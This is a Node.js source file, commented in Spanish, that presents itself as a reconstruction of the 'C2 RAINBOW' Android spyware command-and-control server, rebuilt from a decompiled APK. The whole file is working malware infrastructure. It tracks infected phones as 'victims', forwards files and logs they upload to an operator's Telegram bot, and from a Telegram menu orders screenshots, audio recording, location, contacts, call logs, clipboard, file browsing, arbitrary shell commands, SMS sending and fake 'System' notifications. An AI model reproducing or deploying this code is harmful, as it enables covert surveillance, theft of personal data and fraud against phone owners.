const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');

/**
 * RECONSTRUCCIÓN TÉCNICA ESTRICTA - C2 RAINBOW
 * Basada en el análisis de 'server (1).js' y descompilación Smali.
 */

// Carga de configuración
let config = { token: "", id: "" };
try {
    config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
} catch (e) {
    console.error("Error: Falta data.json");
    process.exit(1);
}

const app = express();
const server = http.createServer(app);

// CONFIGURACIÓN DE SOCKET.IO PARA COMPATIBILIDAD CON APK ANTIGUOS
const io = new Server(server, {
    cors: { origin: "*" },
    allowEIO3: true, // OBLIGATORIO para clientes antiguos (v3)
    transports: ['polling', 'websocket'],
    pingInterval: 25000,
    pingTimeout: 5000,
    cookie: false
});

const bot = new TelegramBot(config.token, { polling: true });

// Almacenamiento de víctimas y estados (appData en el original)
const victims = new Map(); // socket.id -> {id, model, version}
const userStates = new Map(); // chatId -> {targetSocketId, step, tempData}

app.use(express.json());

// --- RECEPCIÓN DE ARCHIVOS Y TEXTO (HTTP) ---

const upload = multer({ storage: multer.memoryStorage() });

app.post('/upload', upload.single('file'), (req, res) => {
    const devId = req.headers['currenttarget'];
    if (req.file) {
        bot.sendDocument(config.id, req.file.buffer, {
            caption: `<b>✯ 𝙰𝚛𝚌𝚑𝚒𝚟𝚘 𝚛𝚎𝚌𝚒𝚋𝚒𝚍𝚘: ${devId} ✯</b>`,
            parse_mode: 'HTML'
        }, { filename: req.file.originalname });
    }
    res.status(200).send('Done');
});

app.post('/text', (req, res) => {
    const devId = req.headers['currenttarget'];
    bot.sendMessage(config.id, `<b>✯ 𝙻𝚘𝚐 [${devId}]:</b>\n<pre>${req.body.text}</pre>`, { parse_mode: 'HTML' });
    res.status(200).send('Done');
});

// --- COMUNICACIÓN POR SOCKET (Lógica de n.smali) ---

io.on('connection', (socket) => {
    // El APK envía los parámetros en la query del handshake
    const query = socket.handshake.query;
    const deviceId = query.currenttarget || socket.handshake.headers['currenttarget'];
    const model = query.model || "Unknown";
    const version = query.version || "1.0";

    if (!deviceId) return socket.disconnect();

    // Registro de víctima
    victims.set(socket.id, { id: deviceId, model: model, version: version });

    bot.sendMessage(config.id, `<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 ✯</b>\n\n<b>𝚖𝚘𝚍𝚎𝚕:</b> ${model}\n<b>𝚒𝚍:</b> <code>${deviceId}</code>\n<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗:</b> ${version}`, { parse_mode: 'HTML' });

    // Escuchar respuestas (data) del dispositivo
    socket.on('data', (data) => {
        const payload = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
        bot.sendMessage(config.id, `<b>✯ 𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎 𝚏𝚛𝚘𝚖 ${model} ✯</b>\n<pre>${payload}</pre>`, { parse_mode: 'HTML' });
    });

    socket.on('disconnect', () => {
        if (victims.has(socket.id)) {
            bot.sendMessage(config.id, `<b>❌ 𝙳𝚒𝚜𝚙𝚘𝚜𝚒𝚝𝚒𝚟𝚘 𝚘𝚏𝚏𝚕𝚒𝚗𝚎:</b> ${victims.get(socket.id).model}`);
            victims.delete(socket.id);
        }
    });
});

// --- INTERFAZ DE TELEGRAM (Strings Unicode del original) ---

const KB_MAIN = [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯'], ['✯ 𝙰𝚌𝚝𝚒𝚘𝚗𝚜 𝚏𝚘𝚛 𝚊𝚕𝚕 ✯']];

const KB_DEVICE_OPTS = [
    ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝙰𝚞𝚍𝚒𝚘 𝚛𝚎𝚌𝚘𝚛𝚍𝚎𝚛 ✯'],
    ['✯ 𝙵𝚒𝚕𝚎 𝚖𝚊𝚗𝚊𝚐𝚎𝚛 ✯', '✯ 𝚂𝙼𝚂 𝚖𝚊𝚗𝚊𝚐𝚎𝚛 ✯'],
    ['✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝙲𝚊𝚕𝚕 𝚕𝚘𝚐𝚜 ✯'],
    ['✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯', '✯ 𝙸𝚗𝚜𝚝𝚊𝚕𝚕𝚎𝚍 𝚊𝚙𝚙𝚜 ✯'],
    ['✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯', '✯ 𝚂𝚑𝚎𝚕𝚕 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 ✯'],
    ['✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯', '✯ 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗 ✯'],
    ['✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
];

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    if (String(chatId) !== String(config.id)) return;
    const text = msg.text;

    // Navegación principal
    if (text === '/start' || text === '✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯') {
        userStates.delete(chatId);
        return bot.sendMessage(chatId, "<b>✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯</b>", {
            parse_mode: 'HTML',
            reply_markup: { keyboard: KB_MAIN, resize_keyboard: true }
        });
    }

    // Listado de víctimas
    if (text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
        const buttons = [];
        victims.forEach((val, key) => {
            buttons.push([`${val.model} (${val.id})`]);
        });
        if (buttons.length === 0) return bot.sendMessage(chatId, "No victims online.");
        buttons.push(['✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']);
        return bot.sendMessage(chatId, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗 ✯</b>", {
            parse_mode: 'HTML',
            reply_markup: { keyboard: buttons, resize_keyboard: true }
        });
    }

    // Selección de dispositivo individual
    for (let [sid, data] of victims) {
        if (text === `${data.model} (${data.id})`) {
            userStates.set(chatId, { target: sid });
            return bot.sendMessage(chatId, `<b>✯ 𝙰𝚌𝚝𝚒𝚘𝚗𝚜 𝚏𝚘𝚛 ${data.model} ✯</b>`, {
                parse_mode: 'HTML',
                reply_markup: { keyboard: KB_DEVICE_OPTS, resize_keyboard: true }
            });
        }
    }

    const state = userStates.get(chatId);
    if (!state || !state.target) return;

    const socket = io.sockets.sockets.get(state.target);
    if (!socket) {
        bot.sendMessage(chatId, "Victim disconnected.");
        return userStates.delete(chatId);
    }

    // --- PROCESAMIENTO DE COMANDOS (Fiel a la lógica ofuscada) ---

    let payload = null;

    // Manejo de entrada de datos (steps)
    if (state.step) {
        switch (state.step) {
            case 'AUDIO': payload = { order: 'record-audio', duration: text }; break;
            case 'SHELL': payload = { order: 'shell', command: text }; break;
            case 'PUSH': payload = { order: 'notification', title: 'System', text: text }; break;
            case 'SMS_NUM':
                state.tempNum = text;
                state.step = 'SMS_MSG';
                return bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 ✯</b>", { parse_mode: 'HTML' });
            case 'SMS_MSG':
                payload = { order: 'send-sms', number: state.tempNum, text: text };
                break;
        }
        delete state.step;
    } else {
        // Switch de órdenes principales
        switch (text) {
            case '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯': payload = { order: 'screenshot' }; break;
            case '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯': payload = { order: 'contacts' }; break;
            case '✯ 𝙲𝚊𝚕𝚕 𝚕𝚘𝚐𝚜 ✯': payload = { order: 'calls' }; break;
            case '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯': payload = { order: 'clipboard' }; break;
            case '✯ 𝙸𝚗𝚜𝚝𝚊𝚕𝚕𝚎𝚍 𝚊𝚙𝚙𝚜 ✯': payload = { order: 'apps' }; break;
            case '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯': payload = { order: 'vibrate' }; break;
            case '✯ 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗 ✯': payload = { order: 'location' }; break;
            case '✯ 𝙵𝚒𝚕𝚎 𝚖𝚊𝚗𝚊𝚐𝚎𝚛 ✯': payload = { order: 'file-explorer', path: '/' }; break;
            case '✯ 𝙰𝚞𝚍𝚒𝚘 𝚛𝚎𝚌𝚘𝚛𝚍𝚎𝚛 ✯':
                state.step = 'AUDIO';
                return bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 (𝚜𝚎𝚌) ✯</b>", { parse_mode: 'HTML' });
            case '✯ 𝚂𝚑𝚎𝚕𝚕 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 ✯':
                state.step = 'SHELL';
                return bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 ✯</b>", { parse_mode: 'HTML' });
            case '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯':
                state.step = 'PUSH';
                return bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 𝚝𝚎𝚡𝚝 ✯</b>", { parse_mode: 'HTML' });
            case '✯ 𝚂𝙼𝚂 𝚖𝚊𝚗𝚊𝚐𝚎𝚛 ✯':
                state.step = 'SMS_NUM';
                return bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 ✯</b>", { parse_mode: 'HTML' });
        }
    }

    if (payload) {
        socket.emit('data', payload);
        bot.sendMessage(chatId, `🚀 Order <code>${payload.order}</code> sent.`, { parse_mode: 'HTML' });
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`[C2] Reconstrucción lista en el puerto ${PORT}`));
